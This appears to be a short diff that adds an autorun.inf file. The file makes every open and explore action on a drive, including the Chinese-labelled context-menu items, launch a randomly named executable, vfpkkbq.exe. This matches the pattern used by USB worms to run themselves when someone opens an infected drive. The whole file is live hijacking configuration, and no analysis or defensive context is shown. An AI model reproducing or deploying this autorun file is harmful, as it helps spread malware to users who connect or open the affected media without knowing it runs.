@@ -1,0 +1,7 @@
+[AutoRun]
+open=vfpkkbq.exe
+shell\open=打开(&O)
+shell\open\Command=vfpkkbq.exe
+shell\open\Default=1
+shell\explore=资源管理器(&X)
+shell\explore\Command=vfpkkbq.exe
